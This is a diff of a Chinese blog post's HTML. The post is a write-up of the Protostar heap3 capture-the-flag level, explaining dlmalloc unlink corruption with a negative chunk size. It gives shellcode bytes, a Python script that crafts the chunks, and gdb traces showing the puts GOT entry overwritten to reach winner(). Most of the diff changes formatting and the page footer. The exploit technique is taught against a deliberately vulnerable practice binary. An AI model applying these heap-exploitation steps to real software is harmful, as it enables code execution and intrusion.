-<p>调用时，第一个参数 P 是要unlink的数据块，参数 BK 和 FD 是用于存储上一个和下一个空闲数据块指针的临时变量。当一个数据块被解除链接时，下一个空闲数据块 P-&gt;fd 和上一个空闲数据块 P-&gt;bk 会相互指向。 </p>
-<p> 如下图： </p>
+<p>调用时，第一个参数 P 是要unlink的数据块，参数 BK 和 FD 是用于存储上一个和下一个空闲数据块指针的临时变量。当一个数据块被解除链接时，下一个空闲数据块 P-&gt;fd 和上一个空闲数据块 P-&gt;bk 会相互指向。</p>
+<p>如下图：</p>
 <p><img src="/img/044fb4315b9f50d52fcc5a173fda9078.png"></p>
 <p><strong>P (free chunk)：</strong><br>这是当前被“unlink”（即解除链接）的空闲内存块。它在双向空闲链表中，并且包含了fd（forward pointer，指向下一个块）和bk（backward pointer，指向前一个块）。</p>
 <p><strong>BK (previous free chunk)：</strong><br>这是P之前的空闲内存块，它的fd指针指向P。</p>
@@ -814,7 +764,7 @@ Breakpoint 9, main (argc=4, argv=0xbffff834) at heap3/heap3.c:28
 <p>这里puts函数的plt表地址是0x8048790，我们可以查看这个地址，找到put函数的got表地址<br><img src="/img/1731908803894.png"></p>
 <p><img src="/img/1731908833316.png"></p>
 <p>gdb将printf函数解析成了put函数，没什么问题，put函数的got表地址为<strong>0x804b128</strong></p>
-<p>现在的计划现在很清楚了。我们将在堆上的某个地方存储调用 winner() 的 shellcode，然后在一个特制的块上强制合并块并调用unlink。该块的 fd 字段包含 0x0804b11c = (0x0804b128-12)，bk 字段包含 shellcode 的地址。我们不能将 winner() 的地址写入 bk，因为这部分内存是不可写的，而且 BK-&gt;fd 也将作为 unlink 的一部分被更新。</p>
+<p>现在的计划现在很清楚了。我们将在堆上的某个地方存储调用 winner() 的 shellcode，然后在一个特制的块上强制合并块并调用unlink。该块的 fd 字段包含 0x0804b11c &#x3D; (0x0804b128-12)，bk 字段包含 shellcode 的地址。我们不能将 winner() 的地址写入 bk，因为这部分内存是不可写的，而且 BK-&gt;fd 也将作为 unlink 的一部分被更新。</p>
 <h3 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h3><h4 id="负数size的块"><a href="#负数size的块" class="headerlink" title="负数size的块"></a>负数size的块</h4><p>我们可以用 -4 (0xfffffffc) 作为块大小</p>
 <p><img src="/img/1731908909257.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">当使用 fastbin 时，malloc 会将块大小转换为无符号 int，因此 -4 比 64 大。
@@ -826,20 +776,20 @@ Breakpoint 9, main (argc=4, argv=0xbffff834) at heap3/heap3.c:28
 <p>需要注意的是，shellcode 要很短（8 字节或更短），因为 “shellcode 的地址 “+8 处的内存将被 unlink 覆盖。</p>
 <p>winner函数地址：</p>
 <pre class="line-numbers language-none"><code class="language-none">(gdb) p winner
-$1 = {void (void)} 0x8048864 &lt;winner&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+$1 &#x3D; &#123;void (void)&#125; 0x8048864 &lt;winner&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p> 用汇编指令调用winner函数： </p>
+<p>用汇编指令调用winner函数：</p>
 <pre class="line-numbers language-none"><code class="language-none">push 0x08048864
 ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p> 使用这个网站将汇编指令调用winner函数的指令转化 ：</p>
-<pre class="line-numbers language-none"><code class="language-none">https://shell-storm.org/online/Online-Assembler-and-Disassembler/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>使用这个网站将汇编指令调用winner函数的指令转化 ：</p>
+<pre class="line-numbers language-none"><code class="language-none">https:&#x2F;&#x2F;shell-storm.org&#x2F;online&#x2F;Online-Assembler-and-Disassembler&#x2F;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="/img/1731909150376.png"></p>
-<p> call winner： </p>
+<p>call winner：</p>
 <pre class="line-numbers language-none"><code class="language-none">\x68\x64\x88\x04\x08\xc3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<p>我们用第三个块来存储我们精心设计的块。我们将把 shellcode 存储在第二个块，并用它来覆盖 prev_size 和最后一个块的大小 0xfffffffc。 </p>
+<p>我们用第三个块来存储我们精心设计的块。我们将把 shellcode 存储在第二个块，并用它来覆盖 prev_size 和最后一个块的大小 0xfffffffc。</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span>
 <span class="token keyword">import</span> struct
 <span class="token comment"># 输入的第一个参数</span>
@@ -865,8 +815,8 @@ buffers <span class="token operator">=</span> <span class="token punctuation">[<
 
 <p><img src="/img/1731909382992.png"></p>
 <p><img src="/img/1731909445917.png"></p>
-<p> 成功破解程序，现在我们用gdb来看看堆里是什么样子的 </p>
-<pre class="line-numbers language-none"><code class="language-none">(gdb) r $(cat /tmp/A) $(cat /tmp/B) $(cat /tmp/C)
+<p>成功破解程序，现在我们用gdb来看看堆里是什么样子的</p>
+<pre class="line-numbers language-none"><code class="language-none">(gdb) r $(cat &#x2F;tmp&#x2F;A) $(cat &#x2F;tmp&#x2F;B) $(cat &#x2F;tmp&#x2F;C)
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
 
@@ -886,8 +836,8 @@ Continuing.
 0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
 0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000
 
-Breakpoint 3, 0x080488be in main (argc=4, argv=0xbffff824) at heap3/heap3.c:18
-18      in heap3/heap3.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+Breakpoint 3, 0x080488be in main (argc&#x3D;4, argv&#x3D;0xbffff824) at heap3&#x2F;heap3.c:18
+18      in heap3&#x2F;heap3.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p><img src="/img/1731911112774.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">(gdb) c
@@ -904,8 +854,8 @@ Continuing.
 0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
 0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000
 
-Breakpoint 4, main (argc=4, argv=0xbffff824) at heap3/heap3.c:21
-21      in heap3/heap3.c
+Breakpoint 4, main (argc&#x3D;4, argv&#x3D;0xbffff824) at heap3&#x2F;heap3.c:21
+21      in heap3&#x2F;heap3.c
 (gdb) c
 Continuing.
 0x80488f2 &lt;main+105&gt;:   mov    0xc(%ebp),%eax
@@ -920,8 +870,8 @@ Continuing.
 0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
 0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000
 
-Breakpoint 5, main (argc=4, argv=0xbffff824) at heap3/heap3.c:22
-22      in heap3/heap3.c
+Breakpoint 5, main (argc&#x3D;4, argv&#x3D;0xbffff824) at heap3&#x2F;heap3.c:22
+22      in heap3&#x2F;heap3.c
 (gdb) c
 Continuing.
 0x804890a &lt;main+129&gt;:   mov    0x1c(%esp),%eax
@@ -936,10 +886,10 @@ Continuing.
 0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
 0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000
 
-Breakpoint 6, main (argc=4, argv=0xbffff824) at heap3/heap3.c:24
-24      in heap3/heap3.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+Breakpoint 6, main (argc&#x3D;4, argv&#x3D;0xbffff824) at heap3&#x2F;heap3.c:24
+24      in heap3&#x2F;heap3.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<p> 执行free与unlink </p>
+<p>执行free与unlink</p>
 <p><img src="/img/1731911188062.png"></p>
 <pre class="line-numbers language-none"><code class="language-none">(gdb) c
 Continuing.
@@ -955,8 +905,8 @@ Continuing.
 0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
 0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000
 
-Breakpoint 7, main (argc=4, argv=0xbffff824) at heap3/heap3.c:25
-25      in heap3/heap3.c
+Breakpoint 7, main (argc&#x3D;4, argv&#x3D;0xbffff824) at heap3&#x2F;heap3.c:25
+25      in heap3&#x2F;heap3.c
 (gdb) c
 Continuing.
 0x8048922 &lt;main+153&gt;:   mov    0x14(%esp),%eax
@@ -971,8 +921,8 @@ Continuing.
 0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
 0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000
 
-Breakpoint 8, main (argc=4, argv=0xbffff824) at heap3/heap3.c:26
-26      in heap3/heap3.c
+Breakpoint 8, main (argc&#x3D;4, argv&#x3D;0xbffff824) at heap3&#x2F;heap3.c:26
+26      in heap3&#x2F;heap3.c
 (gdb) c
 Continuing.
 0x804892e &lt;main+165&gt;:   movl   $0x804ac27,(%esp)
@@ -987,15 +937,15 @@ Continuing.
 0x804c080:      0x00000000      0x00000000      0x00000000      0x00000000
 0x804c090:      0x00000000      0x00000000      0x00000000      0x00000000
 
-Breakpoint 9, main (argc=4, argv=0xbffff824) at heap3/heap3.c:28
-28      in heap3/heap3.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+Breakpoint 9, main (argc&#x3D;4, argv&#x3D;0xbffff824) at heap3&#x2F;heap3.c:28
+28      in heap3&#x2F;heap3.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-<pre class="line-numbers language-none"><code class="language-none">(gdb) x/x 0x804b128
+<pre class="line-numbers language-none"><code class="language-none">(gdb) x&#x2F;x 0x804b128
 0x804b128 &lt;_GLOBAL_OFFSET_TABLE_+64&gt;:   0x0804c040<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 
-<p> puts函数的got表地址成功被覆盖成了winner函数的地址 </p>
+<p>puts函数的got表地址成功被覆盖成了winner函数的地址</p>
 <p><img src="/img/1731911306453.png"></p>
-<p> 这里推荐<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=HWhzH--89UQ&amp;list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&amp;index=31">LiveOverflow</a>博主的视频教程 </p>
+<p>这里推荐<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=HWhzH--89UQ&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=31">LiveOverflow</a>博主的视频教程</p>
 
                 
             </div>
@@ -1022,7 +972,7 @@ Breakpoint 9, main (argc=4, argv=0xbffff824) at heap3/heap3.c:28
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://Pr0b1em.github.io/2024/11189e20.html">https://Pr0b1em.github.io/2024/11189e20.html</a>
+                    <a href="https://pr0b1em.github.io/2024/11189e20.html">https://pr0b1em.github.io/2024/11189e20.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -1060,12 +1010,12 @@ Breakpoint 9, main (argc=4, argv=0xbffff824) at heap3/heap3.c:28
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/pwn/">
-                                    <span class="chip bg-color">pwn</span>
-                                </a>
-                            
                                 <a href="/tags/%E7%AC%94%E8%AE%B0/">
                                     <span class="chip bg-color">笔记</span>
+                                </a>
+                            
+                                <a href="/tags/pwn/">
+                                    <span class="chip bg-color">pwn</span>
                                 </a>
                             
                         </div>
@@ -1076,7 +1026,7 @@ Breakpoint 9, main (argc=4, argv=0xbffff824) at heap3/heap3.c:28
 <div id="article-share">
 
     
-    <div class="social-share" data-sites="qq,wechat" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
     <script src="/libs/share/js/social-share.min.js"></script>
     
 
@@ -1235,12 +1185,12 @@ Breakpoint 9, main (argc=4, argv=0xbffff824) at heap3/heap3.c:28
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/pwn/">
-                        <span class="chip bg-color">pwn</span>
-                    </a>
-                    
                     <a href="/tags/%E7%AC%94%E8%AE%B0/">
                         <span class="chip bg-color">笔记</span>
+                    </a>
+                    
+                    <a href="/tags/pwn/">
+                        <span class="chip bg-color">pwn</span>
                     </a>
                     
                 </div>
@@ -1254,50 +1204,10 @@ Breakpoint 9, main (argc=4, argv=0xbffff824) at heap3/heap3.c:28
 </div>
 
 
-<script>
-    $('#articleContent').on('copy', function (e) {
-        // IE8 or earlier browser is 'undefined'
-        if (typeof window.getSelection === 'undefined') return;
-
-        var selection = window.getSelection();
-        // if the selection is short let's not annoy our users.
-        if (('' + selection).length < Number.parseInt('120')) {
-            return;
-        }
-
-        // create a div outside of the visible area and fill it with the selected text.
-        var bodyElement = document.getElementsByTagName('body')[0];
-        var newdiv = document.createElement('div');
-        newdiv.style.position = 'absolute';
-        newdiv.style.left = '-99999px';
-        bodyElement.appendChild(newdiv);
-        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
-
-        // we need a <pre> tag workaround.
-        // otherwise the text inside "pre" loses all the line breaks!
-        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE' || selection.getRangeAt(0).commonAncestorContainer.nodeName === 'CODE') {
-            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
-        }
-
-        var url = document.location.href;
-        newdiv.innerHTML += '<br />'
-            + '来源: 8023<br />'
-            + '文章作者: Pr0b1em<br />'
-            + '文章链接: <a href="' + url + '">' + url + '</a><br />'
-            + '本文章著作权归作者Pr0b1em所有，任何形式的转载都请注明出处。';
-
-        selection.selectAllChildren(newdiv);
-        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
-    });
-</script>
-
 
 <!-- 代码块功能依赖 -->
 <script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
 
-
-  <!-- 是否加载使用自带的 prismjs. -->
-  <script type="text/javascript" src="/libs/prism/prism.min.js"></script>
 
 
 <!-- 代码语言 -->
@@ -1421,7 +1331,7 @@ Breakpoint 9, main (argc=4, argv=0xbffff824) at heap3/heap3.c:28
             <br>
             
                 &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                        class="white-color">43.8k</span>
+                        class="white-color">44.7k</span>
             
             
             
@@ -1455,8 +1365,8 @@ Breakpoint 9, main (argc=4, argv=0xbffff824) at heap3/heap3.c:28
                         var startYear = "2021";
                         var startMonth = "6";
                         var startDate = "17";
-                        var startHour = "17";
-                        var startMinute = "30";
+                        var startHour = "0";
+                        var startMinute = "0";
                         var startSecond = "0";
                         var todayYear = today.getFullYear();
                         var todayMonth = today.getMonth() + 1;
@@ -1501,7 +1411,7 @@ Breakpoint 9, main (argc=4, argv=0xbffff824) at heap3/heap3.c:28
             
                 <span id="icp"><img src="/medias/icp.png"
                                     style="vertical-align: text-bottom;"/>
-                <a href="https://www.beian.gov.cn" target="_blank">渝ICP备2024047956号 | 渝公网安备50011702501074号</a>
+                <a href="https://beian.miit.gov.cn/" target="_blank">渝ICP备2024047956号-1</a> | <a href="https://www.beian.gov.cn" target="_blank">渝公网安备50011702501074号</a>
             </span>
             
         </div>
@@ -1756,8 +1666,14 @@ $(function () {
     
     <script src="/libs/instantpage/instantpage.js" type="module"></script>
     
+
+
+    
+    <script src="/live2dw/lib/L2Dwidget.min.js"></script>
+    <script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script>
+    
     <script src="/js/FunnyTitle.js"></script>
 
-<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true}});</script></body>
+</body>
 
 </html>
